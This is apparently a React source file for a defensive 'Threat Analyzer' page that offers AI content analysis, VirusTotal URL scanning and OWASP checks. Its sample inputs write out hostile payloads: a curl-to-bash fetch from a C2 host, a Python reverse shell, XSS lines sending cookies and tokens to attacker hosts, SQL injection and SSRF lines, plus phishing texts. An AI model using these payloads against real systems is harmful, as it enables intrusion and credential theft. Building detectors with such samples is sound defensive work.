import React, { useState } from 'react';
import api from '../utils/api';

// ─── Shared UI ────────────────────────────────────────────────────────────────

const RiskMeter = ({ score }) => {
  const color = score >= 70 ? '#ff3366' : score >= 40 ? '#ffd700' : '#00ff88';
  return (
    <div className="relative h-3 bg-slate-800 rounded-full overflow-hidden">
      <div className="h-full rounded-full transition-all duration-700"
        style={{ width: `${score}%`, background: `linear-gradient(90deg, #00ff88, ${color})` }} />
    </div>
  );
};

const VerdictBadge = ({ verdict }) => {
  const map = {
    SAFE: 'badge-safe',
    SUSPICIOUS: 'badge-suspicious',
    DANGEROUS: 'badge-dangerous'
  };
  const icons = { SAFE: '✅', SUSPICIOUS: '⚠️', DANGEROUS: '🚨' };
  return (
    <div className={`inline-flex items-center gap-3 px-6 py-3 rounded-xl ${map[verdict]}`}>
      <span className="text-2xl">{icons[verdict]}</span>
      <span className="font-mono font-bold text-xl">{verdict}</span>
    </div>
  );
};

const SeverityBadge = ({ severity }) => (
  <span className={`px-2 py-0.5 rounded font-mono text-xs font-bold ${
    severity === 'HIGH' ? 'badge-dangerous' : 'badge-suspicious'
  }`}>{severity}</span>
);

// ─── Tab: AI Threat Analyzer ─────────────────────────────────────────────────

const SAMPLES = [
  {
    label: 'Phishing Email',
    content: `From: security@paypa1.com\nSubject: URGENT: Your account has been limited\n\nDear Customer,\n\nWe have detected unusual activity on your PayPal account. Your account access has been limited.\n\nPlease verify your information immediately:\nhttp://paypal-secure-verify.malicious-site.ru/login\n\nFailure to verify within 24 hours will result in permanent suspension.\n\nPayPal Security Team`
  },
  {
    label: 'Malicious Code',
    content: `import os, subprocess\nurl = "http://evil-c2.ru/payload.sh"\nos.system(f"curl -s {url} | bash")\nsubprocess.Popen(['python3','-c','import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'])`
  },
  {
    label: 'Smishing SMS',
    content: `[BANK ALERT] Your account has been suspended due to suspicious activity. Verify immediately at: http://bank-secure-alert.xyz/verify?id=8821 or call 1-800-FAKE-NUM. Reply STOP to unsubscribe.`
  }
];

function AIAnalyzer() {
  const [content, setContent] = useState('');
  const [result, setResult] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const analyze = async () => {
    if (!content.trim()) return;
    setLoading(true); setResult(null); setError('');
    try {
      const res = await api.post('/analyzer/analyze', { content });
      setResult(res.data.analysis);
    } catch (err) {
      setError(err.response?.data?.error || 'Analysis failed. Ensure the server is running.');
    } finally { setLoading(false); }
  };

  return (
    <div className="grid lg:grid-cols-2 gap-6">
      {/* Input */}
      <div className="space-y-4">
        <div>
          <div className="font-mono text-xs text-slate-600 mb-2 tracking-widest">LOAD SAMPLE</div>
          <div className="flex flex-wrap gap-2">
            {SAMPLES.map(s => (
              <button key={s.label} onClick={() => { setContent(s.content); setResult(null); setError(''); }}
                className="px-3 py-1.5 rounded font-mono text-xs border border-slate-700 text-slate-400 hover:border-cyber-accent/40 hover:text-cyber-accent transition-all">
                {s.label}
              </button>
            ))}
          </div>
        </div>
        <div className="cyber-card rounded-xl overflow-hidden">
          <div className="flex items-center gap-2 px-4 py-3 border-b border-slate-800">
            <div className="w-2 h-2 rounded-full bg-cyber-red/60" />
            <div className="w-2 h-2 rounded-full bg-cyber-yellow/60" />
            <div className="w-2 h-2 rounded-full bg-cyber-green/60" />
            <span className="font-mono text-xs text-slate-600 ml-2">threat-input.txt</span>
          </div>
          <textarea value={content} onChange={e => { setContent(e.target.value); setResult(null); setError(''); }}
            placeholder={`Paste suspicious content here...\n\n• Email content\n• Code snippet\n• SMS message\n• Any suspicious text`}
            className="w-full h-64 bg-transparent p-4 font-mono text-sm text-slate-300 resize-none focus:outline-none placeholder-slate-700" />
          <div className="flex items-center justify-between px-4 py-3 border-t border-slate-800">
            <span className="font-mono text-xs text-slate-600">{content.length} chars</span>
            <div className="flex gap-2">
              <button onClick={() => { setContent(''); setResult(null); setError(''); }}
                className="px-3 py-1.5 rounded font-mono text-xs border border-slate-700 text-slate-500 hover:text-slate-300 transition-all">Clear</button>
              <button onClick={analyze} disabled={loading || !content.trim()}
                className="px-6 py-1.5 rounded font-mono text-xs font-medium btn-primary glow-accent disabled:opacity-40 transition-all">
                {loading ? <span className="flex items-center gap-2"><div className="w-3 h-3 border border-cyber-accent/30 border-t-cyber-accent rounded-full animate-spin" />Scanning...</span> : '→ Analyze'}
              </button>
            </div>
          </div>
        </div>
        {error && <div className="p-4 rounded-lg bg-cyber-red/10 border border-cyber-red/30 font-mono text-sm text-cyber-red">⚠ {error}</div>}
      </div>

      {/* Results */}
      <div>
        {loading && (
          <div className="cyber-card rounded-xl p-8 flex flex-col items-center justify-center h-full min-h-64">
            <div className="w-16 h-16 border-2 border-cyber-accent/20 border-t-cyber-accent rounded-full animate-spin mb-6" />
            <div className="font-mono text-sm text-cyber-accent">SCANNING THREAT VECTORS</div>
            <div className="font-mono text-xs text-slate-500 mt-2">Analyzing patterns...</div>
          </div>
        )}
        {!loading && !result && !error && (
          <div className="cyber-card rounded-xl p-8 flex flex-col items-center justify-center h-full min-h-64 text-center">
            <div className="text-4xl mb-4 opacity-20">🛡️</div>
            <div className="font-mono text-sm text-slate-600">Submit content to see AI analysis</div>
          </div>
        )}
        {result && !loading && (
          <div className="space-y-4">
            <div className="cyber-card rounded-xl p-6 text-center">
              <VerdictBadge verdict={result.verdict} />
              <div className="mt-4">
                <div className="flex justify-between font-mono text-xs text-slate-500 mb-2">
                  <span>RISK SCORE</span>
                  <span className={result.riskScore >= 70 ? 'text-cyber-red' : result.riskScore >= 40 ? 'text-cyber-yellow' : 'text-cyber-green'}>{result.riskScore}/100</span>
                </div>
                <RiskMeter score={result.riskScore} />
              </div>
            </div>
            {result.attackType && result.attackType !== 'None detected' && (
              <div className="cyber-card rounded-xl p-4">
                <div className="font-mono text-xs text-slate-500 tracking-widest mb-2">ATTACK TYPE</div>
                <div className="font-mono text-sm font-bold text-cyber-red">⚡ {result.attackType}</div>
              </div>
            )}
            <div className="cyber-card rounded-xl p-4">
              <div className="font-mono text-xs text-slate-500 tracking-widest mb-2">AI ANALYSIS</div>
              <p className="text-sm text-slate-300 leading-relaxed">{result.explanation}</p>
            </div>
            {result.indicators?.length > 0 && (
              <div className="cyber-card rounded-xl p-4">
                <div className="font-mono text-xs text-slate-500 tracking-widest mb-3">RED FLAGS</div>
                <ul className="space-y-2">
                  {result.indicators.map((ind, i) => (
                    <li key={i} className="flex items-start gap-2 text-sm text-cyber-red"><span>▸</span><span>{ind}</span></li>
                  ))}
                </ul>
              </div>
            )}
            {result.dataAtRisk?.length > 0 && (
              <div className="cyber-card rounded-xl p-4">
                <div className="font-mono text-xs text-slate-500 tracking-widest mb-3">DATA AT RISK</div>
                <div className="flex flex-wrap gap-2">
                  {result.dataAtRisk.map((d, i) => <span key={i} className="badge-dangerous px-2 py-1 rounded text-xs font-mono">{d}</span>)}
                </div>
              </div>
            )}
            {result.protectionTips?.length > 0 && (
              <div className="cyber-card rounded-xl p-4">
                <div className="font-mono text-xs text-slate-500 tracking-widest mb-3">PROTECTION STEPS</div>
                <ul className="space-y-2">
                  {result.protectionTips.map((tip, i) => (
                    <li key={i} className="flex items-start gap-2 text-sm text-cyber-green"><span>✓</span><span>{tip}</span></li>
                  ))}
                </ul>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}

// ─── Tab: VirusTotal URL Scanner ──────────────────────────────────────────────

function VirusTotalScanner() {
  const [url, setUrl] = useState('');
  const [result, setResult] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const scan = async () => {
    if (!url.trim()) return;
    setLoading(true); setResult(null); setError('');
    try {
      const res = await api.post('/virustotal/scan-url', { url });
      setResult(res.data);
    } catch (err) {
      setError(err.response?.data?.error || 'Scan failed.');
    } finally { setLoading(false); }
  };

  const SAMPLE_URLS = [
    'https://google.com',
    'http://paypal-secure-login.xyz/verify',
    'https://github.com'
  ];

  return (
    <div className="max-w-3xl mx-auto space-y-6">
      {/* Info banner */}
      <div className="p-4 rounded-xl bg-cyber-accent/5 border border-cyber-accent/20">
        <div className="font-mono text-xs text-cyber-accent tracking-widest mb-1">🔗 REAL THREAT INTELLIGENCE</div>
        <p className="text-sm text-slate-400">Submits URLs to <strong className="text-slate-300">VirusTotal</strong> — checked against 90+ antivirus engines and URL scanners in real-time. Requires a free VirusTotal API key.</p>
      </div>

      {/* Input */}
      <div className="cyber-card rounded-xl p-6 space-y-4">
        <div className="font-mono text-xs text-slate-500 tracking-widest">ENTER URL TO SCAN</div>
        <div className="flex gap-3">
          <input
            type="text"
            value={url}
            onChange={e => { setUrl(e.target.value); setResult(null); setError(''); }}
            onKeyDown={e => e.key === 'Enter' && scan()}
            placeholder="https://suspicious-site.example.com"
            className="flex-1 cyber-input px-4 py-3 rounded-lg font-mono text-sm"
          />
          <button onClick={scan} disabled={loading || !url.trim()}
            className="px-6 py-3 rounded-lg font-mono text-sm font-medium btn-primary glow-accent disabled:opacity-40 transition-all whitespace-nowrap">
            {loading ? (
              <span className="flex items-center gap-2">
                <div className="w-4 h-4 border border-cyber-accent/30 border-t-cyber-accent rounded-full animate-spin" />
                Scanning...
              </span>
            ) : '→ Scan URL'}
          </button>
        </div>
        <div className="flex gap-2 flex-wrap">
          <span className="font-mono text-xs text-slate-600">Try:</span>
          {SAMPLE_URLS.map(u => (
            <button key={u} onClick={() => { setUrl(u); setResult(null); }}
              className="font-mono text-xs text-cyber-accent/60 hover:text-cyber-accent transition-colors">{u}</button>
          ))}
        </div>
      </div>

      {error && <div className="p-4 rounded-lg bg-cyber-red/10 border border-cyber-red/30 font-mono text-sm text-cyber-red">⚠ {error}</div>}

      {loading && (
        <div className="cyber-card rounded-xl p-12 flex flex-col items-center">
          <div className="w-12 h-12 border-2 border-cyber-accent/20 border-t-cyber-accent rounded-full animate-spin mb-4" />
          <div className="font-mono text-sm text-cyber-accent">QUERYING 90+ ENGINES</div>
          <div className="font-mono text-xs text-slate-600 mt-1">Checking VirusTotal database...</div>
        </div>
      )}

      {result && !loading && (
        <div className="space-y-4">
          {/* Verdict */}
          <div className="cyber-card rounded-xl p-6 text-center space-y-4">
            <VerdictBadge verdict={result.verdict} />
            <div className="font-mono text-xs text-slate-500 break-all">{result.url}</div>
          </div>

          {/* Engine stats */}
          <div className="cyber-card rounded-xl p-6">
            <div className="font-mono text-xs text-slate-500 tracking-widest mb-4">SCAN RESULTS — {result.stats?.total || 0} ENGINES</div>
            <div className="grid grid-cols-4 gap-4 text-center">
              {[
                { label: 'MALICIOUS', value: result.stats?.malicious, color: 'text-cyber-red' },
                { label: 'SUSPICIOUS', value: result.stats?.suspicious, color: 'text-cyber-yellow' },
                { label: 'HARMLESS', value: result.stats?.harmless, color: 'text-cyber-green' },
                { label: 'UNDETECTED', value: result.stats?.undetected, color: 'text-slate-500' }
              ].map(s => (
                <div key={s.label}>
                  <div className={`font-mono text-2xl font-bold ${s.color}`}>{s.value ?? 0}</div>
                  <div className="font-mono text-xs text-slate-600 mt-1">{s.label}</div>
                </div>
              ))}
            </div>

            {/* Visual bar */}
            {result.stats?.total > 0 && (
              <div className="mt-4 h-2 rounded-full overflow-hidden flex">
                <div className="bg-cyber-red/80 transition-all" style={{ width: `${(result.stats.malicious / result.stats.total) * 100}%` }} />
                <div className="bg-cyber-yellow/80 transition-all" style={{ width: `${(result.stats.suspicious / result.stats.total) * 100}%` }} />
                <div className="bg-cyber-green/60 transition-all" style={{ width: `${(result.stats.harmless / result.stats.total) * 100}%` }} />
                <div className="bg-slate-700 transition-all flex-1" />
              </div>
            )}
          </div>

          {/* Engines that flagged it */}
          {result.flaggedBy?.length > 0 && (
            <div className="cyber-card rounded-xl p-6">
              <div className="font-mono text-xs text-slate-500 tracking-widest mb-4">FLAGGED BY ({result.flaggedBy.length} engines)</div>
              <div className="space-y-2">
                {result.flaggedBy.map((f, i) => (
                  <div key={i} className="flex items-center justify-between py-2 border-b border-slate-800">
                    <span className="font-mono text-sm text-slate-300">{f.engine}</span>
                    <div className="flex items-center gap-2">
                      <span className="font-mono text-xs text-slate-500">{f.result}</span>
                      <span className={`px-2 py-0.5 rounded font-mono text-xs ${f.category === 'malicious' ? 'badge-dangerous' : 'badge-suspicious'}`}>
                        {f.category}
                      </span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {result.stats?.malicious === 0 && result.stats?.suspicious === 0 && (
            <div className="p-4 rounded-xl bg-cyber-green/5 border border-cyber-green/20 font-mono text-sm text-cyber-green text-center">
              ✅ No engines flagged this URL as malicious
            </div>
          )}
        </div>
      )}
    </div>
  );
}

// ─── Tab: OWASP Top 10 Checker ────────────────────────────────────────────────

const OWASP_SAMPLES = [
  {
    label: 'SQL Injection',
    content: `SELECT * FROM users WHERE id = '1' UNION SELECT username, password FROM admin--`
  },
  {
    label: 'XSS Attack',
    content: `<script>document.location='http://evil.com/steal?c='+document.cookie</script>\n<img src=x onerror="fetch('https://attacker.com/'+btoa(localStorage.getItem('token')))">`
  },
  {
    label: 'Insecure Config',
    content: `DEBUG=True\nALLOW_ALL_ORIGINS = True\nDEFAULT_PASSWORD = "admin123"\nconsole.log("JWT_SECRET:", process.env.JWT_SECRET)\nSESSION_EXPIRE = -1`
  },
  {
    label: 'SSRF',
    content: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\nfetch("http://localhost:8080/admin/users")\nconst data = await fetch(\`file:///etc/passwd\`)`
  }
];

function OWASPChecker() {
  const [content, setContent] = useState('');
  const [result, setResult] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [expanded, setExpanded] = useState(null);

  const check = async () => {
    if (!content.trim()) return;
    setLoading(true); setResult(null); setError('');
    try {
      const res = await api.post('/owasp/check', { content });
      setResult(res.data);
    } catch (err) {
      setError(err.response?.data?.error || 'OWASP check failed.');
    } finally { setLoading(false); }
  };

  return (
    <div className="grid lg:grid-cols-2 gap-6">
      {/* Input */}
      <div className="space-y-4">
        <div className="p-4 rounded-xl bg-cyber-yellow/5 border border-cyber-yellow/20">
          <div className="font-mono text-xs text-cyber-yellow tracking-widest mb-1">⚡ OWASP TOP 10 (2021)</div>
          <p className="text-sm text-slate-400">Checks code or content against all 10 OWASP vulnerability categories — injection, broken auth, SSRF, misconfig, and more.</p>
        </div>

        <div>
          <div className="font-mono text-xs text-slate-600 mb-2 tracking-widest">LOAD SAMPLE</div>
          <div className="flex flex-wrap gap-2">
            {OWASP_SAMPLES.map(s => (
              <button key={s.label} onClick={() => { setContent(s.content); setResult(null); setError(''); }}
                className="px-3 py-1.5 rounded font-mono text-xs border border-slate-700 text-slate-400 hover:border-cyber-yellow/40 hover:text-cyber-yellow transition-all">
                {s.label}
              </button>
            ))}
          </div>
        </div>

        <div className="cyber-card rounded-xl overflow-hidden">
          <div className="flex items-center gap-2 px-4 py-3 border-b border-slate-800">
            <div className="w-2 h-2 rounded-full bg-cyber-red/60" />
            <div className="w-2 h-2 rounded-full bg-cyber-yellow/60" />
            <div className="w-2 h-2 rounded-full bg-cyber-green/60" />
            <span className="font-mono text-xs text-slate-600 ml-2">code-or-content.txt</span>
          </div>
          <textarea value={content} onChange={e => { setContent(e.target.value); setResult(null); setError(''); }}
            placeholder={`Paste code, config files, or any content to check against OWASP Top 10...\n\n• Source code\n• Config files\n• API responses\n• HTTP headers`}
            className="w-full h-64 bg-transparent p-4 font-mono text-sm text-slate-300 resize-none focus:outline-none placeholder-slate-700" />
          <div className="flex items-center justify-between px-4 py-3 border-t border-slate-800">
            <span className="font-mono text-xs text-slate-600">{content.length} chars</span>
            <div className="flex gap-2">
              <button onClick={() => { setContent(''); setResult(null); setError(''); }}
                className="px-3 py-1.5 rounded font-mono text-xs border border-slate-700 text-slate-500 hover:text-slate-300 transition-all">Clear</button>
              <button onClick={check} disabled={loading || !content.trim()}
                className="px-6 py-1.5 rounded font-mono text-xs font-medium border border-cyber-yellow/40 text-cyber-yellow hover:bg-cyber-yellow/10 disabled:opacity-40 transition-all">
                {loading ? <span className="flex items-center gap-2"><div className="w-3 h-3 border border-cyber-yellow/30 border-t-cyber-yellow rounded-full animate-spin" />Checking...</span> : '→ Run OWASP Check'}
              </button>
            </div>
          </div>
        </div>

        {error && <div className="p-4 rounded-lg bg-cyber-red/10 border border-cyber-red/30 font-mono text-sm text-cyber-red">⚠ {error}</div>}
      </div>

      {/* Results */}
      <div>
        {loading && (
          <div className="cyber-card rounded-xl p-8 flex flex-col items-center justify-center h-full min-h-64">
            <div className="w-16 h-16 border-2 border-cyber-yellow/20 border-t-cyber-yellow rounded-full animate-spin mb-6" />
            <div className="font-mono text-sm text-cyber-yellow">RUNNING OWASP CHECKS</div>
            <div className="font-mono text-xs text-slate-500 mt-2">Checking 10 vulnerability categories...</div>
          </div>
        )}
        {!loading && !result && !error && (
          <div className="cyber-card rounded-xl p-8 flex flex-col items-center justify-center h-full min-h-64 text-center">
            <div className="text-4xl mb-4 opacity-20">⚡</div>
            <div className="font-mono text-sm text-slate-600">Submit content to check against OWASP Top 10</div>
          </div>
        )}
        {result && !loading && (
          <div className="space-y-4">
            {/* Summary */}
            <div className="cyber-card rounded-xl p-6">
              <div className="flex items-center justify-between mb-4">
                <VerdictBadge verdict={result.verdict} />
                <div className="text-right">
                  <div className="font-mono text-2xl font-bold text-cyber-yellow">{result.totalVulnerabilities}</div>
                  <div className="font-mono text-xs text-slate-500">VULNERABILITIES</div>
                </div>
              </div>
              <div className="font-mono text-xs text-slate-500 mb-2">RISK SCORE</div>
              <RiskMeter score={result.riskScore} />
              <div className="font-mono text-xs text-slate-600 mt-2 text-right">{result.riskScore}/100</div>
              <div className="font-mono text-xs text-slate-600 mt-3">{result.checkedAgainst}</div>
            </div>

            {/* Findings */}
            {result.findings?.length > 0 ? (
              <div className="space-y-3">
                <div className="font-mono text-xs text-slate-500 tracking-widest">VULNERABILITIES FOUND</div>
                {result.findings.map((f, i) => (
                  <div key={i} className="cyber-card rounded-xl overflow-hidden">
                    <button
                      onClick={() => setExpanded(expanded === i ? null : i)}
                      className="w-full flex items-center justify-between p-4 text-left hover:bg-slate-800/30 transition-colors">
                      <div className="flex items-center gap-3">
                        <span className="font-mono text-xs text-slate-600 w-8">{f.id}</span>
                        <span className="font-mono text-sm font-medium text-slate-300">{f.name}</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <SeverityBadge severity={f.severity} />
                        <span className="text-slate-600 text-xs">{expanded === i ? '▲' : '▼'}</span>
                      </div>
                    </button>
                    {expanded === i && (
                      <div className="px-4 pb-4 border-t border-slate-800 pt-3 space-y-3">
                        <p className="text-sm text-slate-400">{f.description}</p>
                        <div>
                          <div className="font-mono text-xs text-slate-600 mb-2">MATCHED PATTERNS</div>
                          <div className="space-y-1">
                            {f.matches.map((m, j) => (
                              <div key={j} className="font-mono text-xs bg-black/30 px-3 py-1.5 rounded text-cyber-red/80 truncate">
                                {m}
                              </div>
                            ))}
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            ) : (
              <div className="p-6 rounded-xl bg-cyber-green/5 border border-cyber-green/20 text-center">
                <div className="text-3xl mb-2">✅</div>
                <div className="font-mono text-sm text-cyber-green">No OWASP vulnerabilities detected</div>
                <div className="font-mono text-xs text-slate-600 mt-1">Content appears clean against all 10 categories</div>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}

// ─── Main Analyzer Page ───────────────────────────────────────────────────────

const TABS = [
  { id: 'ai', label: '🤖 AI Analyzer', sub: 'Email / SMS / Code' },
  { id: 'vt', label: '🔗 VirusTotal', sub: 'URL Scanner (90+ engines)' },
  { id: 'owasp', label: '⚡ OWASP Top 10', sub: 'Code Vulnerability Check' }
];

export default function Analyzer() {
  const [tab, setTab] = useState('ai');

  return (
    <div className="max-w-6xl mx-auto px-4 py-10">
      {/* Header */}
      <div className="mb-8">
        <div className="font-mono text-xs text-slate-500 tracking-widest mb-2">FEATURE 01</div>
        <h1 className="font-mono text-3xl font-bold text-white mb-2">
          🔍 Threat <span className="text-cyber-accent">Analyzer</span>
        </h1>
        <p className="text-slate-500 text-sm">Three layers of threat intelligence — AI analysis, real-time URL scanning, and OWASP vulnerability detection.</p>
      </div>

      {/* Tab Bar */}
      <div className="flex gap-2 mb-8 flex-wrap">
        {TABS.map(t => (
          <button
            key={t.id}
            onClick={() => setTab(t.id)}
            className={`px-5 py-3 rounded-xl font-mono text-sm transition-all text-left ${
              tab === t.id
                ? 'bg-cyber-accent/10 border border-cyber-accent/40 text-cyber-accent'
                : 'border border-slate-800 text-slate-500 hover:border-slate-600 hover:text-slate-400'
            }`}
          >
            <div className="font-medium">{t.label}</div>
            <div className="text-xs opacity-60 mt-0.5">{t.sub}</div>
          </button>
        ))}
      </div>

      {/* Tab Content */}
      {tab === 'ai' && <AIAnalyzer />}
      {tab === 'vt' && <VirusTotalScanner />}
      {tab === 'owasp' && <OWASPChecker />}
    </div>
  );
}
